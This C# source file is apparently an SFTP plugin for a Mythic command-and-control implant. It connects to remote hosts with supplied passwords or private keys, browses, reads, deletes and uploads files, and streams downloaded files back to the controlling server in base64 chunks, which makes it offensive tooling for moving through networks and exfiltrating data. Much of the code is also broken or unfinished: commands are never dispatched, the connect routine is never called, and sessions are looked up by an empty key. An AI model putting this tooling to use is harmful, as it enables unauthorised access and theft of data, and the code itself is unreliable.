using Agent.Interfaces;
using Agent.Models;
using Agent;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Text.Json;
using Renci.SshNet;
using Agent.Utilities;
using Renci.SshNet.Sftp;
using System.IO;

namespace sftp
{
    public class SftpFileJob
    {
        public string file_id { get; set; }
        public string task_id { get; set; }
        public SftpFileStream stream { get; set; }
        public int total_chunks { get; set; }
        public int chunk_num { get; set; }
        public int chunk_size { get; set; }
        public string path { get; set; }
        public long bytesRead { get; set; }
        public bool complete { get; set; } = false;
        public bool started { get; set; } = false;
        public SftpFileJob(string task_id, SftpFileStream stream, string path, int chunk_size)
        {
            this.stream = stream;
            this.task_id = task_id;
            this.path = path;
            this.chunk_size = chunk_size;
            this.chunk_num = 0;
            this.total_chunks = 0;
            this.chunk_size = chunk_size;
            this.path = path;
        }
        public bool SetTotalChunks(double totalSize)
        {
            try
            {
                this.total_chunks = (int)Math.Ceiling((double)totalSize / chunk_size);
                return true;
            }
            catch
            {
                return false;
            }
        }
    }

    public class Plugin : IInteractivePlugin, IFilePlugin
    {
        public string Name => "sftp";
        //Dictionary<string, SftpSession> sessions = new Dictionary<string, SftpSession>();
        Dictionary<string, SftpClient> sessions = new Dictionary<string, SftpClient>();
        //Dictionary<string, SftpFileStream> streams = new Dictionary<string, SftpFileStream>();
        Dictionary<string, SftpFileJob> downloadJobs = new Dictionary<string, SftpFileJob>();
        Dictionary<string, SftpFileJob> uploadJobs = new Dictionary<string, SftpFileJob>();
        string currentSession = "";
        private IMessageManager messageManager { get; set; }
        private IAgentConfig agentConfig { get; set; }

        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner, IPythonManager pythonManager)
        {
            this.messageManager = messageManager;
            this.agentConfig = config;
        }
        public async Task Execute(ServerJob job)
        {
            SftpArgs args = JsonSerializer.Deserialize<SftpArgs>(job.task.parameters);
        }

        public void Interact(InteractMessage message)
        {
            if(!sessions.ContainsKey(message.task_id) || !sessions[message.task_id].IsConnected){
                ReturnOutput("Session is no longer valid. Please initiate a new session.", message.task_id);
                return;
            }

            var actions = new Dictionary<string, Action>
            {
                { "get", () => StartDownload(message.task_id, message.data) },
                { "ls", () => ListDirectories(message.task_id, message.data) },
                { "cd", () => ChangeDirectory(message.task_id, message.data) },
                { "pwd", () => ReturnOutput(sessions[message.task_id].WorkingDirectory, message.task_id) },
                { "put", () => StartUpload(message.task_id, message.data) },
                { "bye", () => Disconnect(message.task_id) },
                { "exit", () => Disconnect(message.task_id) },
                { "mkdir", () => CreateDirectory(message.task_id, message.data) },
                { "delete", () => DeleteObject(message.task_id, message.data) },
                { "rmdir", () => DeleteObject(message.task_id, message.data) },
                { "cat", () => CatFile(message.task_id, message.data) },
                { "help", () => GetHelp(message.task_id) },
            };
        }

        public async Task HandleNextMessage(ServerTaskingResponse response)
        {
            if (uploadJobs.ContainsKey(response.task_id))
            {
                await HandleUploadMessage(response);
            }
            else if (downloadJobs.ContainsKey(response.task_id))
            {
                 await HandleDownloadMessage(response);
            }
        }
        private async Task HandleDownloadMessage(ServerTaskingResponse response)
        {
            //These jobs will be uncancellable
            SftpFileJob downloadJob = downloadJobs[response.task_id];

            // Handle cancellation or server error
            if (response.status != "success")
            {
                ReturnOutput("An error occurred while communicating with the server.", downloadJob.task_id);
                CompleteFileJob(downloadJob.task_id);
                return;
            }

            // Initialize file ID if not already set
            if (string.IsNullOrEmpty(downloadJob.file_id))
            {
                downloadJob.file_id = response.file_id;
            }

            // Increment the chunk number
            downloadJob.chunk_num++;

            // Check if the job is completed
            bool isCompleted = downloadJob.chunk_num == downloadJob.total_chunks;

            // Prepare the download response
            var downloadResponse = new DownloadTaskResponse
            {
                task_id = response.task_id,
                download = new DownloadTaskResponseData
                {
                    is_screenshot = false,
                    host = string.Empty,
                    file_id = downloadJob.file_id,
                    full_path = downloadJob.path,
                    chunk_num = downloadJob.chunk_num,
                },
                completed = isCompleted,
            };

            var chunk = await DownloadNextChunk(downloadJob);
            // Handle the next chunk
            if (!string.IsNullOrEmpty(chunk))
            {
                downloadResponse.download.chunk_data = chunk;
            }
            else
            {
                ReturnOutput("Empty chunk received from server.", downloadJob.task_id);
                CompleteFileJob(downloadJob.task_id);
                return;
            }

            // Add the response to the message manager
            messageManager.AddTaskResponse(downloadResponse.ToJson());
            ReturnOutput(GetStatusBar(downloadJob.chunk_num, downloadJob.total_chunks), downloadJob.task_id);
            // Complete the job if finished
            if (downloadResponse.completed)
            {
                CompleteFileJob(response.task_id);
            }
        }
        private async Task<string> DownloadNextChunk(SftpFileJob job)
        {
            var chunk = string.Empty;
            if(job is null || job.stream is null)
            {
                return string.Empty;
            }

            try
            {
                long totalBytesRead = job.chunk_size * (job.chunk_num - 1);
                long remainingBytes = job.stream.Length - totalBytesRead;

                // Determine the buffer size based on remaining bytes.
                int bufferSize = (int)Math.Min(job.chunk_size, remainingBytes);
                if (bufferSize <= 0)
                {
                    job.complete = true;
                    ReturnOutput("No data read from stream, but no error returned.", job.task_id);
                    return string.Empty;
                }

                byte[] buffer = new byte[bufferSize];

                // Seek and read from the stream.
                job.stream.Seek(job.bytesRead, SeekOrigin.Begin);
                int bytesRead = await job.stream.ReadAsync(buffer, 0, bufferSize);
                job.bytesRead += bytesRead;

                // Encode the chunk to Base64.
                chunk = Misc.Base64Encode(buffer);

                // Mark job as complete if all bytes are read.
                if (job.bytesRead >= new FileInfo(job.path).Length)
                {
                    job.complete = true;
                }

                return chunk;
            }
            catch (Exception e)
            {
                // Handle exceptions gracefully.
                job.complete = true;
                ReturnOutput(e.ToString(), job.task_id);
                return string.Empty;
            }
        }
        private async Task HandleUploadMessage(ServerTaskingResponse response)
        {
            SftpFileJob uploadJob = uploadJobs[response.task_id];
            //Update the chunks required for the upload
            if (uploadJob.total_chunks == 0)
            {
                if (response.total_chunks == 0)
                {
                    ReturnOutput("Failed to get number of chunks", response.task_id);
                    CompleteFileJob(response.task_id);
                    return;
                }
                uploadJob.total_chunks = response.total_chunks; //Set the number of chunks provided to us from the server
            }

            //Did we get chunk data?
            if (string.IsNullOrEmpty(response.chunk_data)) //Handle our current chunk
            {
                ReturnOutput("No chunk data received from server", response.task_id);
                CompleteFileJob(response.task_id);
                return;
            }

            //Write the chunk data to our stream
            if (!await this.UploadNextChunk(Misc.Base64DecodeToByteArray(response.chunk_data), uploadJob))
            {
                ReturnOutput("Failed to write chunk contents to stream.", response.task_id);
                CompleteFileJob(response.task_id);
                return;
            }

            //Increment chunk number for tracking
            uploadJob.chunk_num++;
            ReturnOutput(GetStatusBar(uploadJob.chunk_num, uploadJob.total_chunks), uploadJob.task_id);
            //Prepare response to Mythic
            UploadTaskResponse ur = new UploadTaskResponse()
            {
                task_id = response.task_id,
                upload = new UploadTaskResponseData
                {
                    chunk_num = uploadJob.chunk_num,
                    file_id = uploadJob.file_id,
                    chunk_size = uploadJob.chunk_size,
                    full_path = uploadJob.path
                }
            };

            //Check if we're done
            if (response.chunk_num == uploadJob.total_chunks)
            {
                ur = new UploadTaskResponse()
                {
                    task_id = response.task_id,
                    upload = new UploadTaskResponseData
                    {
                        file_id = uploadJob.file_id,
                        full_path = uploadJob.path,
                    },
                    completed = true
                };
                CompleteFileJob(response.task_id);
                ReturnOutput("Done.", uploadJob.task_id);
            }

            //Return response
            messageManager.AddTaskResponse(ur.ToJson());
            //These jobs will be uncancellable
        }
        private void CompleteFileJob(string task_id)
        {
            if (uploadJobs.ContainsKey(task_id))
            {
                uploadJobs.Remove(task_id, out var job);
                if (job is null)
                {
                    return;
                }
                job.stream.Close();
                job.stream.Dispose();
            }
            else if (downloadJobs.ContainsKey(task_id))
            {
                downloadJobs.Remove(task_id, out var job);
                if (job is null)
                {
                    return;
                }
                job.stream.Close();
                job.stream.Dispose();
            }
        }
        private async Task<bool> UploadNextChunk(byte[] bytes, SftpFileJob job)
        {
            if (job is null || job.stream is null)
            {
                return false;
            }

            try
            {
                await job.stream.WriteAsync(bytes, 0, bytes.Length);
                return true;
            }
            catch (Exception e)
            {
                ReturnOutput(e.ToString(), job.task_id);
                return false;
            }
        }
        void CreateDirectory(string task_id, string args)
        {
            var parts = Misc.SplitCommandLine(args);
            if (parts.Length == 1 || parts[1] == ".")
            {
                ReturnOutput("Please specify a valid directory", task_id);
            }
            try
            {
                sessions[currentSession].CreateDirectory(parts[1]);
                ReturnOutput($"Successfully created directory", task_id);
            }
            catch (Exception e)
            {
                ReturnOutput(e.ToString(), task_id);
            }
        }
        async Task Connect(string task_id, SftpArgs args, CancellationToken ct)
        {
            string hostname = args.hostname ?? string.Empty; // Ensure args.hostname is not null
            int port = 22; // Default port

            if (hostname.Contains(":"))
            {
                string[] hostnameParts = hostname.Split(':');
                hostname = hostnameParts[0];
                if (hostnameParts.Length > 1 && int.TryParse(hostnameParts[1], out int parsedPort))
                {
                    port = parsedPort;
                }
            }

            ConnectionInfo ci = null;
            AuthenticationMethod authMethod = null;
            if (!string.IsNullOrEmpty(args.keypath))
            {
                PrivateKeyFile pkf = null;
                if (string.IsNullOrEmpty(args.password))
                {
                    pkf = new PrivateKeyFile(args.keypath);
                }
                else
                {
                    pkf = new PrivateKeyFile(args.keypath, args.password);
                }
                authMethod = new PrivateKeyAuthenticationMethod(args.username, [pkf]);
            }
            else
            {
                authMethod = new PasswordAuthenticationMethod(args.username, args.password);
            }
            ci = new ConnectionInfo(hostname, port, args.username, authMethod);
            SftpClient sftpClient = new SftpClient(ci);

            try
            {
                await sftpClient.ConnectAsync(ct);

                if (sftpClient.IsConnected)
                {
                    string guid = Guid.NewGuid().ToString();
                    sessions.Add(task_id, sftpClient);
                    ReturnOutput($"Successfully initiated session {sftpClient.ConnectionInfo.Username}@{sftpClient.ConnectionInfo.Host} - {guid}", task_id);
                }

            }
            catch (Exception e)
            {
                ReturnOutput(e.ToString(), task_id);
            }
        }
        void Disconnect(string task_id)
        {
            if (sessions[task_id].IsConnected)
            {
                try
                {
                    sessions[task_id].Disconnect();
                }
                catch
                {

                }
            }

            sessions.Remove(task_id);
            ReturnOutput("Goodbye.", task_id);
        }
        void ListDirectories(string task_id, string args)
        {
            var parts = Misc.SplitCommandLine(args);
            string path = string.Empty;
            if (parts.Length == 1 || parts[1] == ".")
            {
                path = sessions[task_id].WorkingDirectory;
            }
            else
            {
                path = parts[1];
            }

            var files = sessions[task_id].ListDirectory(path);
            StringBuilder sb = new StringBuilder(path);
            foreach (SftpFile file in files)
            {
                sb.AppendLine($"{FormatPermissions(file)} {file.Attributes.Size.ToString().PadLeft(10)} {file.LastAccessTime} {file.Name}");
            }

            ReturnOutput(sb.ToString(), task_id);
        }
        void ChangeDirectory(string task_id, string args)
        {
            var parts = Misc.SplitCommandLine(args);
            if (parts.Length == 1 || parts[1] == ".")
            {
                ReturnOutput("Please specify a valid directory", task_id);
            }
            try
            {
                sessions[currentSession].ChangeDirectory(parts[1]);
                ReturnOutput($"Successfully changed directory to: {sessions[currentSession].WorkingDirectory}", task_id);
            }
            catch (Exception e)
            {
                ReturnOutput(e.ToString(), task_id);    
            }
        }
        void DeleteObject(string task_id, string args)
        {
            var parts = Misc.SplitCommandLine(args);
            if (parts.Length == 1 || parts[1] == ".")
            {
                ReturnOutput("Please specify a valid file/directory", task_id);
            }
            try
            {
                sessions[currentSession].Delete(parts[1]);
                ReturnOutput($"Successfully deleted {parts[1]}", task_id);
            }
            catch (Exception e)
            {
                ReturnOutput(e.ToString(), task_id);
            }
        }
        void GetHelp(string task_id)
        {
            ReturnOutput("figure it out dummy", task_id);
        }
        void CatFile(string task_id, string args)
        {
            var parts = Misc.SplitCommandLine(args);
            if (parts.Length == 1 || parts[1] == ".")
            {
                ReturnOutput("Please specify a valid file", task_id);
            }
            using (var remoteFileStream = sessions[currentSession].OpenRead(parts[1]))
            {
                try
                {
                    var textReader = new System.IO.StreamReader(remoteFileStream);
                    ReturnOutput(textReader.ReadToEnd(), task_id);
                }
                catch (Exception e)
                {
                    ReturnOutput(e.ToString(), task_id);
                }
            }
        }
        void StartDownload(string task_id, string args)
        {
            var parts = Misc.SplitCommandLine(args);
            if (parts.Length == 1 || parts[1] == ".")
            {
                ReturnOutput("Please specify a valid file", task_id);
            }
            try
            {
                SftpFileStream stream = sessions[currentSession].OpenRead(parts[1]);
                SftpFileJob job = new SftpFileJob(task_id, stream, parts[1], agentConfig.chunk_size);
                if (!job.SetTotalChunks(stream.Length))
                {
                    ReturnOutput("Failed to get file size.", task_id);
                    return;
                }
                downloadJobs.Add(task_id, job);
                messageManager.AddTaskResponse(new DownloadTaskResponse
                {
                    user_output = "",
                    download = new DownloadTaskResponseData()
                    {
                        total_chunks = job.total_chunks,
                        full_path = job.path,
                        chunk_num = 0,
                        chunk_data = string.Empty,
                        is_screenshot = false,
                        host = "",
                    },
                    status = "processed",
                    task_id = job.task_id,
                    completed = false,
                }.ToJson());
                ReturnOutput("Get started.", task_id);
            }
            catch (Exception e)
            {
                ReturnOutput(e.ToString(), task_id);
            }
        }
        void StartUpload(string task_id, string args)
        {
            //Need to decide on how I want this command to look.
            //0       1         2
            //put <file_id> /path/to/file.txt
            var parts = Misc.SplitCommandLine(args);
            if (parts.Length < 3)
            {
                ReturnOutput("Please specify a valid file", task_id);
            }
            try
            {
                SftpFileStream stream = sessions[currentSession].OpenWrite(parts[1]);
                SftpFileJob job = new SftpFileJob(task_id, stream, parts[2], agentConfig.chunk_size);
                job.chunk_num = 1;
                uploadJobs.Add(task_id, job);
                messageManager.AddTaskResponse(new UploadTaskResponse
                {
                    task_id = job.task_id,
                    upload = new UploadTaskResponseData
                    {
                        chunk_size = job.chunk_size,
                        chunk_num = job.chunk_num,
                        file_id = parts[1],
                        full_path = parts[2],
                    }
                }.ToJson());
                ReturnOutput("Put started.", task_id);
            }
            catch (Exception e)
            {
                ReturnOutput(e.ToString(), task_id);
            }
        }
        private void ReturnOutput(string message, string task_id)
        {
            this.messageManager.AddInteractMessage(new InteractMessage()
            {
                task_id = task_id,
                data = Misc.Base64Encode(message + Environment.NewLine),
                message_type = InteractiveMessageType.Output,
            });
        }
        string FormatPermissions(SftpFile file)
        {
            string typeFlag = file.IsSymbolicLink ? "s" : (file.IsDirectory ? "d" : "-");

            // Mimic Linux-style permissions, e.g., "-rw-r--r--"
            return typeFlag + 
                    string.Format("{0}{1}{2}",
                file.OwnerCanRead ? "r" : "-",
                file.OwnerCanWrite ? "w" : "-",
                file.OwnerCanExecute? "x" : "-"
            ) +
                    string.Format("{0}{1}{2}",
                file.GroupCanRead ? "r" : "-",
                file.GroupCanWrite ? "w" : "-",
                file.GroupCanExecute ? "x" : "-"
            ) +
                    string.Format("{0}{1}{2}",
                file.OthersCanRead ? "r" : "-",
                file.OthersCanWrite ? "w" : "-",
                file.OthersCanExecute ? "x" : "-"
            );
        }
        string GetStatusBar(int chunk_num, int total_chunks)
        {
            int barWidth = 50; // Width of the status bar in characters
            double progress = (double)chunk_num / total_chunks;
            int filledBars = (int)(progress * barWidth);
            int emptyBars = barWidth - filledBars;

            string bar = new string('#', filledBars) + new string('-', emptyBars);
            return $"[{bar}] {progress:P0}"; // \r overwrites the current line
        }

    }
}
